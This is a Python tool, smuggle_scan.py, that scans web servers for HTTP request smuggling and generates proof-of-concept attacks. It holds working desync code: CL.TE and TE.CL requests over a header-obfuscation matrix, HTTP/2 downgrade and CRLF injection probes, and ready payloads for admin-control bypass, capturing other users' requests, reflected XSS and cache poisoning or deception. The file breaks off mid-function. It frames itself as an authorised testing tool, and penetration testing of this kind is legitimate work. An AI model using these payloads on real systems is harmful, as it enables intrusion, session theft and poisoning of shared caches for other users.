#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
smuggle_scan.py — Advanced HTTP Request Smuggling (desync) scanner + PoC forge.

Covers:
  * HTTP/1.1 CL.TE and TE.CL desync via timing-differential probing across a
    large Transfer-Encoding obfuscation matrix.
  * HTTP/2 -> HTTP/1.1 downgrade desync: H2.CL, H2.TE, and H2 header CRLF
    injection (request splitting through the downgrade).
  * Optional differential-response confirmation (PortSwigger 404 technique) to
    corroborate a timing hit with a second, content-based signal.
  * A full raw-HTTP PoC catalogue for each confirmed finding: front-end control
    bypass, capturing another user's request, reflected XSS, web cache
    poisoning, web cache deception, and response-queue poisoning.

Detection is timing/response-shape only and never poisons a shared cache or
serves a payload to a real user. All weaponised payloads are WRITTEN TO A FILE
for manual, authorised verification in Burp Suite Repeater — the scanner never
fires them. See README.md.

Only test systems you own or are explicitly authorised to assess.
"""

import argparse
import base64
import concurrent.futures as futures
import json
import os
import random
import socket
import ssl
import string
import sys
import threading
import time
from dataclasses import dataclass, asdict, field
from urllib.parse import urlsplit

try:
    import h2.connection
    import h2.config
    import h2.events
    _HAS_H2 = True
except Exception:                       # pragma: no cover
    _HAS_H2 = False

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #

DEFAULT_UA = "Mozilla/5.0 (compatible; smuggle-scan/2.0; +authorized-testing)"
RECV_CHUNK = 4096
BANNER = r"""
  ___                          _        ___
 / __| _ __ _  _  __ _  __ _ | | ___  / __| __ __ _  _ _
 \__ \| '  \ || |/ _` |/ _` || |/ -_) \__ \/ _/ _` || ' \
 |___/|_|_|_\_,_|\__, |\__, ||_|\___| |___/\__\__,_||_||_|
                 |___/ |___/   HTTP/1.1 + HTTP/2 desync scanner v2.0
"""

COMMON_HEADERS = [
    ("User-Agent", DEFAULT_UA),
    ("Accept", "*/*"),
    ("Accept-Encoding", "identity"),
]


# --------------------------------------------------------------------------- #
# Data classes
# --------------------------------------------------------------------------- #

@dataclass
class Target:
    raw: str
    scheme: str
    host: str
    port: int
    path: str

    @property
    def use_tls(self):
        return self.scheme == "https"

    @property
    def origin(self):
        return f"{self.scheme}://{self.host}:{self.port}"


@dataclass
class SendResult:
    elapsed: float
    timed_out: bool
    got_headers: bool
    status_line: str = ""
    status_code: int = 0
    error: str = ""
    nbytes: int = 0


@dataclass
class Finding:
    url: str
    host: str
    port: int
    scheme: str
    path: str
    kind: str                 # CL.TE | TE.CL | H2.CL | H2.TE | H2.CRLF
    channel: str              # http/1.1 | http/2
    mutation_name: str
    mutation_repr: str
    baseline_s: float
    attack1_s: float
    control_s: float
    attack2_s: float
    confidence: str
    evidence: str = ""
    raw_request_b64: str = ""


# --------------------------------------------------------------------------- #
# Targets
# --------------------------------------------------------------------------- #

def parse_target(raw):
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        raise ValueError("empty/comment")
    if "://" not in raw:
        raw = "https://" + raw
    p = urlsplit(raw)
    scheme = p.scheme.lower()
    if scheme not in ("http", "https"):
        raise ValueError("scheme")
    if not p.hostname:
        raise ValueError("host")
    port = p.port or (443 if scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return Target(raw, scheme, p.hostname, port, path)


def load_targets(args):
    seen, out = set(), []

    def add(line):
        try:
            t = parse_target(line)
        except ValueError:
            return
        k = (t.scheme, t.host, t.port, t.path)
        if k not in seen:
            seen.add(k)
            out.append(t)

    if args.url:
        add(args.url)
    if args.list:
        with open(args.list, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                add(line)
    return out


# --------------------------------------------------------------------------- #
# HTTP/1.1 mutation matrix
# --------------------------------------------------------------------------- #

def build_mutations(header="Transfer-Encoding", value="chunked"):
    VT, FF, NUL = "\x0b", "\x0c", "\x00"
    m, a = [], None
    m = []
    def a(name, line): m.append((name, line))
    a("baseline-valid",       f"{header}: {value}")
    a("space-before-colon",   f"{header} : {value}")
    a("no-space-after-colon", f"{header}:{value}")
    a("tab-after-colon",      f"{header}:\t{value}")
    a("leading-space-name",   f" {header}: {value}")
    a("double-space-value",   f"{header}:  {value}")
    a("tab-space-value",      f"{header}: \t{value}")
    a("vertical-tab-value",   f"{header}:{VT}{value}")
    a("form-feed-value",      f"{header}:{FF}{value}")
    a("value-upper",          f"{header}: {value.upper()}")
    a("value-capitalized",    f"{header}: {value.capitalize()}")
    a("name-lower",           f"{header.lower()}: {value}")
    a("name-weird-case",      f"transfer-Encoding: {value}")
    a("quoted-value",         f'{header}: "{value}"')
    a("value-trailing-tab",   f"{header}: {value}\t")
    a("value-nul-suffix",     f"{header}: {value}{NUL}")
    a("chunked-cow-suffix",   f"{header}: {value}cow")
    a("x-then-te",            f"X: X\r\n{header}: {value}")
    a("obs-fold-lf",          f"{header}:\n {value}")
    a("obs-fold-crlf",        f"{header}:\r\n\t{value}")
    a("name-lf-colon",        f"{header}\n : {value}")
    a("bare-cr-in-name",      f"X: y\r{header}: {value}")
    a("bare-lf-in-name",      f"X: y\n{header}: {value}")
    a("dup-te-valid-first",   f"{header}: {value}\r\n{header}: cow")
    a("dup-te-valid-second",  f"{header}: cow\r\n{header}: {value}")
    a("dup-identity-first",   f"{header}: identity\r\n{header}: {value}")
    a("chunk-ext",            f"{header}: {value};x=1")
    return m


def _head(method, path, host, extra=None):
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    for k, v in COMMON_HEADERS:
        lines.append(f"{k}: {v}")
    for k, v in (extra or []):
        lines.append(f"{k}: {v}")
    return lines


def build_baseline_request(t):
    return ("\r\n".join(_head("POST", t.path, t.host, [("Content-Length", "0")]))
            + "\r\n\r\n").encode("latin-1")


def build_clte_attack(t, te_line):
    head = "\r\n".join(_head("POST", t.path, t.host, [("Content-Length", "4")]))
    return (head + "\r\n" + te_line + "\r\n\r\n" + "1\r\nA\r\nX").encode("latin-1")


def build_clte_control(t, te_line):
    body = "1\r\nA\r\n0\r\n\r\n"
    cl = len(body.encode("latin-1"))
    head = "\r\n".join(_head("POST", t.path, t.host, [("Content-Length", str(cl))]))
    return (head + "\r\n" + te_line + "\r\n\r\n" + body).encode("latin-1")


def build_tecl_attack(t, te_line):
    head = "\r\n".join(_head("POST", t.path, t.host, [("Content-Length", "6")]))
    return (head + "\r\n" + te_line + "\r\n\r\n" + "0\r\n\r\n").encode("latin-1")


def build_tecl_control(t, te_line):
    body = "0\r\n\r\n"
    cl = len(body.encode("latin-1"))
    head = "\r\n".join(_head("POST", t.path, t.host, [("Content-Length", str(cl))]))
    return (head + "\r\n" + te_line + "\r\n\r\n" + body).encode("latin-1")


# --------------------------------------------------------------------------- #
# Raw HTTP/1.1 sender (memory bounded)
# --------------------------------------------------------------------------- #

def _tls_wrap(sock, host, alpn, insecure):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(alpn)
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(sock, server_hostname=host)


def _status_code(status_line):
    try:
        return int(status_line.split(" ", 2)[1])
    except (IndexError, ValueError):
        return 0


def send_raw(t, payload, timeout, max_bytes, insecure):
    start = time.perf_counter()
    sock = None
    try:
        sock = socket.create_connection((t.host, t.port), timeout=timeout)
        if t.use_tls:
            sock = _tls_wrap(sock, t.host, ["http/1.1"], insecure)
        sock.settimeout(timeout)
        start = time.perf_counter()
        sock.sendall(payload)
        data = bytearray()
        got, tout = False, False
        try:
            while len(data) < max_bytes:
                chunk = sock.recv(RECV_CHUNK)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data:
                    got = True
                    break
        except socket.timeout:
            tout = True
        elapsed = time.perf_counter() - start
        sl = bytes(data).split(b"\r\n", 1)[0].decode("latin-1", "replace") if data else ""
        return SendResult(elapsed, tout, got, sl, _status_code(sl), "", len(data))
    except socket.timeout as e:
        return SendResult(time.perf_counter() - start, True, False, error=f"timeout:{e}")
    except (OSError, ssl.SSLError) as e:
        return SendResult(time.perf_counter() - start, False, False,
                          error=f"{type(e).__name__}:{e}")
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass


# --------------------------------------------------------------------------- #
# HTTP/2 downgrade sender
# --------------------------------------------------------------------------- #

def h2_supported(t, timeout, insecure):
    """Return True if the origin negotiates HTTP/2 via ALPN (TLS only)."""
    if not (_HAS_H2 and t.use_tls):
        return False
    try:
        raw = socket.create_connection((t.host, t.port), timeout=timeout)
        tls = _tls_wrap(raw, t.host, ["h2", "http/1.1"], insecure)
        proto = tls.selected_alpn_protocol()
        tls.close()
        return proto == "h2"
    except (OSError, ssl.SSLError):
        return False


def h2_send(t, headers, body, timeout, insecure, max_bytes=8192):
    """Send one crafted HTTP/2 request with outbound validation DISABLED so we
    can inject illegal headers (transfer-encoding, bogus content-length, CRLF).
    Returns SendResult where got_headers=True means a response came back on the
    stream; timed_out means the backend stalled (candidate downgrade desync)."""
    start = time.perf_counter()
    sock = None
    try:
        raw = socket.create_connection((t.host, t.port), timeout=timeout)
        sock = _tls_wrap(raw, t.host, ["h2", "http/1.1"], insecure)
        if sock.selected_alpn_protocol() != "h2":
            return SendResult(0, False, False, error="no-h2-alpn")
        cfg = h2.config.H2Configuration(
            client_side=True,
            validate_outbound_headers=False,
            normalize_outbound_headers=False,
            validate_inbound_headers=False,
        )
        conn = h2.connection.H2Connection(config=cfg)
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        sid = 1
        conn.send_headers(sid, headers, end_stream=(body is None))
        sock.sendall(conn.data_to_send())
        if body is not None:
            conn.send_data(sid, body if isinstance(body, bytes) else body.encode(),
                           end_stream=True)
            sock.sendall(conn.data_to_send())

        start = time.perf_counter()
        sock.settimeout(timeout)
        got, tout, status, reset = False, False, 0, False
        read = 0
        try:
            while read < max_bytes:
                buf = sock.recv(RECV_CHUNK)
                if not buf:
                    break
                read += len(buf)
                for ev in conn.receive_data(buf):
                    if isinstance(ev, h2.events.ResponseReceived):
                        got = True
                        for k, v in ev.headers:
                            if k in (b":status", ":status"):
                                try:
                                    status = int(v)
                                except (TypeError, ValueError):
                                    pass
                    elif isinstance(ev, (h2.events.StreamReset,)):
                        reset = True
                    elif isinstance(ev, h2.events.StreamEnded):
                        got = got or True
                try:
                    out = conn.data_to_send()
                    if out:
                        sock.sendall(out)
                except Exception:
                    pass
                if got or reset:
                    break
        except socket.timeout:
            tout = True
        elapsed = time.perf_counter() - start
        sl = f"HTTP/2 {status}" if status else ("RST_STREAM" if reset else "")
        return SendResult(elapsed, tout, got, sl, status,
                          "reset" if reset else "", read)
    except socket.timeout as e:
        return SendResult(time.perf_counter() - start, True, False, error=f"timeout:{e}")
    except (OSError, ssl.SSLError, Exception) as e:  # h2 protocol errors too
        return SendResult(time.perf_counter() - start, False, False,
                          error=f"{type(e).__name__}:{e}")
    finally:
        if sock:
            try:
                sock.close()
            except OSError:
                pass


def h2_baseline_headers(t):
    return [(":method", "GET"), (":path", t.path),
            (":authority", t.host), (":scheme", "https"),
            ("user-agent", DEFAULT_UA), ("accept", "*/*")]


# --------------------------------------------------------------------------- #
# Scanner
# --------------------------------------------------------------------------- #

class Scanner:
    def __init__(self, args):
        self.args = args
        self.mutations = build_mutations()
        self.print_lock = threading.Lock()

    def log(self, msg, level="info"):
        if level == "debug" and not self.args.verbose:
            return
        with self.print_lock:
            print(msg, file=sys.stderr, flush=True)

    # ---- HTTP/1.1 -------------------------------------------------------- #

    def _baseline(self, t):
        samples = []
        for _ in range(max(1, self.args.baseline_samples)):
            r = send_raw(t, build_baseline_request(t), self.args.timeout,
                         self.args.max_response_bytes, self.args.insecure)
            if r.error:
                return None, r.error
            if r.timed_out and not r.got_headers:
                return None, "baseline timed out"
            samples.append(r.elapsed)
            time.sleep(self.args.delay)
        return (min(samples) if samples else self.args.timeout), None

    def _hangs(self, res, base):
        if res.error:
            return False
        if res.timed_out and not res.got_headers:
            return True
        floor = max(self.args.min_hang, base * self.args.hang_factor)
        return res.elapsed >= floor and not res.got_headers

    def _fast(self, res, base):
        if res.error or res.timed_out:
            return False
        ceil = max(self.args.min_hang * 0.5, base * 3.0 + 0.5)
        return res.got_headers and res.elapsed <= ceil

    def _diff_confirm(self, t, kind):
        """PortSwigger differential-response confirmation. Smuggles a benign
        GET to a random non-existent path; if the NEXT request on a fresh conn
        (or the same pipelined stream) returns that 404 signature, smuggling is
        content-confirmed. Kept benign (harmless GET) but still touches the
        response queue -> gated behind --diff-confirm with a warning."""
        canary = "/sg-" + _rand(10)
        smuggled = (f"GET {canary} HTTP/1.1\r\nHost: {t.host}\r\n"
                    f"X-Sg: 1\r\nContent-Length: 10\r\n\r\nx=")
        outer = wrap_smuggle(kind, t.host, t.path, smuggled).encode("latin-1")
        r = send_raw(t, outer, self.args.attack_timeout,
                     self.args.max_response_bytes, self.args.insecure)
        # follow-up normal request on a new connection
        time.sleep(self.args.delay)
        follow = send_raw(t, build_baseline_request(t), self.args.timeout,
                          self.args.max_response_bytes, self.args.insecure)
        if follow.status_code in (404, 400, 405) and follow.status_code != 0:
            return f"differential: follow-up request returned {follow.status_code} " \
                   f"after smuggling GET {canary}"
        return ""

    def _variant(self, t, base, name, te_line, build_atk, build_ctl, kind):
        atk = build_atk(t, te_line)
        r1 = send_raw(t, atk, self.args.attack_timeout,
                      self.args.max_response_bytes, self.args.insecure)
        time.sleep(self.args.delay)
        if not self._hangs(r1, base):
            return None
        rc = send_raw(t, build_ctl(t, te_line), self.args.attack_timeout,
                      self.args.max_response_bytes, self.args.insecure)
        time.sleep(self.args.delay)
        if not self._fast(rc, base):
            return None
        r2 = send_raw(t, atk, self.args.attack_timeout,
                      self.args.max_response_bytes, self.args.insecure)
        time.sleep(self.args.delay)
        if not self._hangs(r2, base):
            return None

        confidence, evidence = "medium", "timing: attack hangs, control fast, reproduced"
        if self.args.diff_confirm:
            ev = self._diff_confirm(t, kind)
            if ev:
                confidence, evidence = "high", evidence + " | " + ev
        self.log(f"    [!] {t.host} {kind} via '{name}' "
                 f"(atk1={r1.elapsed:.2f} ctrl={rc.elapsed:.2f} atk2={r2.elapsed:.2f} "
                 f"base={base:.2f}) conf={confidence}")
        return Finding(t.raw, t.host, t.port, t.scheme, t.path, kind, "http/1.1",
                       name, repr(te_line), round(base, 3), round(r1.elapsed, 3),
                       round(rc.elapsed, 3), round(r2.elapsed, 3), confidence,
                       evidence, base64.b64encode(atk).decode())

    # ---- HTTP/2 ---------------------------------------------------------- #

    def _h2_baseline(self, t):
        best = None
        for _ in range(max(1, self.args.baseline_samples)):
            r = h2_send(t, h2_baseline_headers(t), None,
                        self.args.timeout, self.args.insecure)
            if r.error or (r.timed_out and not r.got_headers):
                return None, r.error or "h2 baseline timeout"
            best = r.elapsed if best is None else min(best, r.elapsed)
            time.sleep(self.args.delay)
        return best, None

    def _h2_probe(self, t, base, kind, headers, body):
        # IMPORTANT: a 400 / 421 / RST_STREAM in response to an injected
        # transfer-encoding or CRLF header is the server CORRECTLY REJECTING the
        # request — that is secure behaviour, NOT a desync. The only reliable
        # timing signal over H2 is a genuine BACKEND STALL after the downgrade
        # (the front-end accepted the request and the back-end then hung).
        r1 = h2_send(t, headers, body, self.args.attack_timeout, self.args.insecure)
        time.sleep(self.args.delay)
        stalled = r1.timed_out and not r1.got_headers
        if not stalled:
            return None
        # re-confirm the stall
        r2 = h2_send(t, headers, body, self.args.attack_timeout, self.args.insecure)
        time.sleep(self.args.delay)
        if not (r2.timed_out and not r2.got_headers):
            return None
        confidence = "medium"
        evidence = (f"h2 downgrade: backend stall reproduced "
                    f"r1={r1.status_line or r1.error or 'timeout'} "
                    f"r2={r2.status_line or r2.error or 'timeout'} (base={base:.2f}s)")
        self.log(f"    [!] {t.host} {kind} (h2) {evidence} conf={confidence}")
        rawrepr = "H2 headers=" + repr(headers) + " body=" + repr(body)
        return Finding(t.raw, t.host, t.port, t.scheme, t.path, kind, "http/2",
                       kind, rawrepr, round(base, 3), round(r1.elapsed, 3),
                       0.0, round(r2.elapsed, 3), confidence, evidence,
                       base64.b64encode(rawrepr.encode()).decode())

    def _scan_h2(self, t):
        out = []
        if not (self.args.http2 and _HAS_H2 and t.use_tls):
            return out
        if not h2_supported(t, self.args.timeout, self.args.insecure):
            self.log(f"    [i] {t.host}: no HTTP/2 (ALPN) — skipping h2 tests", "debug")
            return out
        base, err = self._h2_baseline(t)
        if base is None:
            self.log(f"    [i] {t.host}: h2 baseline failed ({err})", "debug")
            return out
        auth = t.host
        # H2.TE — inject transfer-encoding; compliant stacks must strip it.
        te_headers = [(":method", "POST"), (":path", t.path),
                      (":authority", auth), (":scheme", "https"),
                      ("transfer-encoding", "chunked")]
        f = self._h2_probe(t, base, "H2.TE", te_headers, b"1\r\nA\r\nX")
        if f: out.append(f)
        # H2.CL — declare content-length: 0 but send a body (smuggled prefix).
        cl_headers = [(":method", "POST"), (":path", t.path),
                      (":authority", auth), (":scheme", "https"),
                      ("content-length", "0")]
        smug = f"GET /sg-{_rand(8)} HTTP/1.1\r\nHost: {auth}\r\n\r\n"
        f = self._h2_probe(t, base, "H2.CL", cl_headers, smug.encode())
        if f: out.append(f)
        # H2.CRLF — split a request out of a header value.
        crlf_val = f"x\r\nHost: {auth}\r\nContent-Length: 40\r\n\r\nGET /sg-{_rand(6)} HTTP/1.1\r\nX: x"
        crlf_headers = [(":method", "GET"), (":path", t.path),
                        (":authority", auth), (":scheme", "https"),
                        ("foo", crlf_val)]
        f = self._h2_probe(t, base, "H2.CRLF", crlf_headers, None)
        if f: out.append(f)
        return out

    # ---- orchestration --------------------------------------------------- #

    def scan_target(self, t):
        findings = []
        base, err = self._baseline(t)
        if base is None:
            self.log(f"[-] {t.origin}: skipped ({err})")
        else:
            self.log(f"[*] {t.origin}: baseline {base:.3f}s, "
                     f"{len(self.mutations)} mutations x2 (CL.TE/TE.CL)")
            for name, te in self.mutations:
                f = self._variant(t, base, name, te, build_clte_attack,
                                  build_clte_control, "CL.TE")
                if f:
                    findings.append(f)
                    if self.args.stop_on_first:
                        break
                f = self._variant(t, base, name, te, build_tecl_attack,
                                  build_tecl_control, "TE.CL")
                if f:
                    findings.append(f)
                    if self.args.stop_on_first:
                        break
        # HTTP/2 downgrade tests
        try:
            findings.extend(self._scan_h2(t))
        except Exception as e:  # noqa: BLE001
            self.log(f"    [i] {t.host}: h2 module error {type(e).__name__}: {e}", "debug")
        if not findings:
            self.log(f"[-] {t.origin}: no desync detected")
        return findings

    def run(self, targets):
        results, lock = [], threading.Lock()
        with futures.ThreadPoolExecutor(max_workers=self.args.workers) as ex:
            fut = {ex.submit(self.scan_target, t): t for t in targets}
            for f in futures.as_completed(fut):
                t = fut[f]
                try:
                    r = f.result()
                except Exception as e:  # noqa: BLE001
                    self.log(f"[-] {t.origin}: worker {type(e).__name__}: {e}")
                    continue
                if r:
                    with lock:
                        results.extend(r)
        return results


# --------------------------------------------------------------------------- #
# Smuggling wrappers + PoC catalogue (all raw HTTP for Burp Repeater)
# --------------------------------------------------------------------------- #

def _rand(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits)
                   for _ in range(n))


def wrap_smuggle(kind, host, path, smuggled):
    """Wrap an inner (smuggled) request in a CL.TE or TE.CL outer request."""
    if kind in ("CL.TE", "H2.CL", "H2.CRLF"):
        tail = "0\r\n\r\n" + smuggled
        cl = len(tail.encode("latin-1"))
        return (f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {cl}\r\n"
                f"Transfer-Encoding: chunked\r\n\r\n"
                f"{tail}")
    else:  # TE.CL / H2.TE
        hexlen = f"{len(smuggled.encode('latin-1')):x}"
        prefix = f"{hexlen}\r\n"
        cl = len(prefix.encode("latin-1"))
        return (f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {cl}\r\n"
                f"Transfer-Encoding: chunked\r\n\r\n"
                f"{prefix}{smuggled}\r\n0\r\n\r\n")


def _visualize(raw):
    s = raw.decode("latin-1")
    return (s.replace("\r\n", "\\r\\n\n")
             .replace("\x00", "\\x00").replace("\x0b", "\\x0b").replace("\x0c", "\\x0c"))


def _block(title, note, raw_str):
    return (f"## {title}\n"
            f"## {note}\n"
            f"{raw_str}\n"
            f"## ---8<--- end ---8<---\n\n")


def poc_control_bypass(f):
    smug = (f"GET /admin HTTP/1.1\r\nHost: {f.host}\r\n"
            f"X-Sg: {_rand(6)}\r\nContent-Length: 10\r\n\r\nx=")
    return _block(
        f"ATTACK A — Bypass front-end access controls ({f.kind})",
        "Front-end blocks /admin but forwards smuggled bytes; back-end serves it. "
        "Send twice; the 2nd response on the connection should be the /admin body.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_capture_request(f):
    # Large Content-Length on the smuggled request so the victim's following
    # request gets appended into a parameter you can later read back.
    smug = (f"POST /sg-capture-{_rand(6)} HTTP/1.1\r\nHost: {f.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 400\r\n\r\nstolen=")
    return _block(
        f"ATTACK B — Capture another user's request ({f.kind})",
        "The oversized Content-Length makes the back-end read the NEXT user's "
        "request into 'stolen='. Retrieve it wherever that endpoint stores/echoes "
        "input (comment, search log, profile field). Use a benign sink you control.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_xss(f):
    marker = _rand()
    xss = f'"><script>/*{marker}*/alert(document.domain)</script>'
    smug = (f"GET {f.path}?sg={marker} HTTP/1.1\r\nHost: {f.host}\r\n"
            f"User-Agent: {xss}\r\nReferer: {xss}\r\n"
            f"Content-Length: 5\r\n\r\nx=")
    return _block(
        f"ATTACK C — Reflected XSS via smuggling ({f.kind}) [marker {marker}]",
        "If the app reflects a smuggled header/path unsanitised, the NEXT victim "
        "response on the connection carries the payload. Grep responses for the marker.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_cache_poison(f):
    cb, marker = _rand(), _rand()
    smug = (f"GET /{cb}-poc HTTP/1.1\r\nHost: {f.host}\r\n"
            f"X-Forwarded-Host: evil-{marker}.example\r\n"
            f"X-Forwarded-Scheme: nothttps\r\nContent-Length: 5\r\n\r\nx=")
    return _block(
        f"ATTACK D — Web cache poisoning ({f.kind}) [canary /{cb}-poc]",
        f"SAFE canary path so real users are unaffected. Send this, then request "
        f"GET /{cb}-poc . If the cached response reflects evil-{marker}.example the "
        f"cache is poisoned. Never target a live user path.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_cache_deception(f):
    cb = _rand()
    smug = (f"GET /account?sg={cb} HTTP/1.1\r\nHost: {f.host}\r\n"
            f"Content-Length: 5\r\n\r\nx=")
    return _block(
        f"ATTACK E — Web cache deception ({f.kind}) [id {cb}]",
        "Smuggle a request for an authenticated page so a victim's private "
        "response is stored in a cacheable slot you can then fetch. Verify only "
        "with your OWN second account; do not harvest real users' data.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_queue_poison(f):
    smug = (f"GET /sg-{_rand(6)}-notfound HTTP/1.1\r\nHost: {f.host}\r\n"
            f"Content-Length: 15\r\n\r\nx=")
    return _block(
        f"ATTACK F — Response-queue poisoning / desync confirmation ({f.kind})",
        "Smuggles a harmless request to a non-existent path. After sending, a "
        "normal follow-up request should receive the 404 for THIS smuggled path — "
        "proving responses are desynchronised. This is the safest live confirmation.",
        wrap_smuggle(f.kind, f.host, f.path, smug))


def poc_h2_specific(f):
    if f.channel != "http/2":
        return ""
    note = {
        "H2.TE": "Re-send in Burp: HTTP/2 request with an added 'transfer-encoding: "
                 "chunked' header (use Inspector to add it). A conforming server "
                 "strips it; a vulnerable downgrade forwards it -> desync.",
        "H2.CL": "Re-send in Burp: HTTP/2 request with 'content-length: 0' plus a "
                 "non-empty body containing the smuggled request below. The body is "
                 "treated as a new request after the H1 downgrade.",
        "H2.CRLF": "Re-send in Burp: inject \\r\\n into an HTTP/2 header value to "
                   "split out the smuggled request line after downgrade. Burp's "
                   "Inspector allows raw header values.",
    }.get(f.kind, "HTTP/2 downgrade smuggling.")
    inner = f"GET /sg-{_rand(6)} HTTP/1.1\r\nHost: {f.host}\r\n\r\n"
    return _block(
        f"ATTACK G — HTTP/2 downgrade weaponisation ({f.kind})",
        note + " Smuggled inner request (place in the H2 body / injected value):",
        inner)


SENDER_HELPER = r'''#!/usr/bin/env python3
"""send_raw.py — send a byte-exact .raw HTTP/1.1 request and report timing.

Bytes are sent VERBATIM: no CRLF, Content-Length or HTTP-version rewriting.
That is the whole point for smuggling PoCs. AUTHORISED TARGETS ONLY.

Modes
  Direct  : python3 send_raw.py <host> <port> <file.raw> [--plain] [--timeout 10]
  Via Burp: python3 send_raw.py <host> <port> <file.raw> --proxy 127.0.0.1:8080

--proxy tunnels through Burp with CONNECT so the exact request lands in Burp.
Workflow to get a byte-exact request into Repeater WITHOUT hitting the target:
  1) Burp > Proxy > Intercept ON
  2) run this with --proxy 127.0.0.1:8080
  3) Burp pauses on the request -> right-click -> Send to Repeater (Ctrl+R)
  4) click Drop so the original never reaches the target
  5) test in Repeater (turn OFF 'Update Content-Length', force HTTP/1.1)
"""
import socket, ssl, sys, time, argparse

def _read_headers(sock, cap=4096):
    data = b""
    try:
        while len(data) < cap:
            c = sock.recv(1024)
            if not c:
                break
            data += c
            if b"\r\n\r\n" in data:
                break
    except socket.timeout:
        return data, True
    return data, False

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host"); ap.add_argument("port", type=int)
    ap.add_argument("rawfile")
    ap.add_argument("--plain", action="store_true", help="no TLS (port 80)")
    ap.add_argument("--proxy", default=None, help="HOST:PORT of Burp proxy (CONNECT tunnel)")
    ap.add_argument("--timeout", type=float, default=10.0)
    a = ap.parse_args()

    with open(a.rawfile, "rb") as fh:
        payload = fh.read()
    cr, lf = payload.count(b"\r"), payload.count(b"\n")
    print(f"[i] {len(payload)} bytes | CR={cr} LF={lf} "
          f"({'CRLF balanced' if cr == lf else 'note: CR!=LF (intentional bare-LF mutation, or corrupted)'})")
    if not payload.endswith(b"\n"):
        print("[!] file has no trailing newline — chunk terminator may be incomplete")

    # connect (optionally through Burp proxy via CONNECT)
    if a.proxy:
        phost, pport = a.proxy.rsplit(":", 1)
        s = socket.create_connection((phost, int(pport)), timeout=a.timeout)
        s.settimeout(a.timeout)
        s.sendall(f"CONNECT {a.host}:{a.port} HTTP/1.1\r\n"
                  f"Host: {a.host}:{a.port}\r\n\r\n".encode())
        resp, _ = _read_headers(s)
        line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        if " 200" not in line:
            print(f"[!] proxy CONNECT failed: {line!r}"); sys.exit(1)
        print(f"[i] proxy CONNECT ok via {a.proxy} -> {a.host}:{a.port}")
    else:
        s = socket.create_connection((a.host, a.port), timeout=a.timeout)

    if not a.plain:
        ctx = ssl.create_default_context()
        ctx.set_alpn_protocols(["http/1.1"])
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=a.host)
    s.settimeout(a.timeout)

    t0 = time.perf_counter()
    s.sendall(payload)
    data, timed_out = _read_headers(s)
    dt = time.perf_counter() - t0
    try:
        s.close()
    except OSError:
        pass
    status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace") if data else "(none)"
    print(f"[i] elapsed {dt:.2f}s | {'TIMED OUT / HANG' if timed_out else 'responded'} "
          f"| status: {status}")
    print("[i] NOTE: a hang is NOT proof — it can be front-end tarpit. Confirm with the "
          "_queue request + a normal follow-up (look for the smuggled 404).")

if __name__ == "__main__":
    main()
'''


def write_raw_dir(dirpath, findings, args):
    """Emit byte-exact .raw files (guaranteed CRLF) + send commands + sender."""
    os.makedirs(dirpath, exist_ok=True)
    with open(os.path.join(dirpath, "send_raw.py"), "w", encoding="utf-8") as fh:
        fh.write(SENDER_HELPER)

    index = ["BYTE-EXACT RAW REQUESTS — smuggle_scan",
             "=" * 64,
             "Every .raw file holds EXACT bytes with Windows CRLF line endings.",
             "",
             "GET IT INTO BURP REPEATER — pick one:",
             "",
             "A) Notepad++ paste (Windows clipboard preserves CRLF):",
             "   1. Open the .raw in Notepad++. View > Show Symbol > Show All",
             "      Characters — every line must end with CR LF.",
             "   2. Ctrl+A, Ctrl+C. In a Repeater tab (Raw view) select all, paste.",
             "   3. Repeater menu: UNTICK 'Update Content-Length'.",
             "   4. Inspector: set HTTP version to HTTP/1.",
             "   5. Switch editor to Hex; tail must read ... 30 0d 0a 0d 0a.",
             "",
             "B) Intercept-and-drop (byte-exact, nothing reaches the target):",
             "   1. Burp > Proxy > Intercept ON.",
             "   2. python3 send_raw.py <host> <port> <file.raw> --proxy 127.0.0.1:8080",
             "   3. Right-click the paused request > Send to Repeater (Ctrl+R).",
             "   4. Click Drop.  5. Test in Repeater as above.",
             "",
             "C) Just see the hang (no Burp):",
             "   python3 send_raw.py <host> <port> <file.raw>",
             "",
             "_detect.raw  = detection probe (expect a hang if the timing signal holds;",
             "               a hang alone is NOT proof — see below)",
             "_queue.raw   = SAFE response-queue confirmation; send it, then send one",
             "               normal request on a NEW connection and look for the 404",
             "               to the smuggled /sg-* path (THAT is real confirmation).",
             "=" * 64, ""]

    n_written = 0
    for i, f in enumerate(findings, 1):
        safe_host = f.host.replace(":", "_")
        if f.channel == "http/1.1":
            detect = base64.b64decode(f.raw_request_b64)          # exact bytes
        else:
            # H2 finding: no raw H1 request; drop a note file and continue
            with open(os.path.join(dirpath, f"{i:03d}_{safe_host}_{f.kind}.txt"),
                      "w", encoding="utf-8") as fh:
                fh.write("HTTP/2 finding — no raw HTTP/1.1 request. Vector:\n")
                fh.write(f.mutation_repr + "\n")
            continue

        # queue-confirm request (fresh, CRLF-correct)
        queue_smug = (f"GET /sg-{_rand(6)}-notfound HTTP/1.1\r\nHost: {f.host}\r\n"
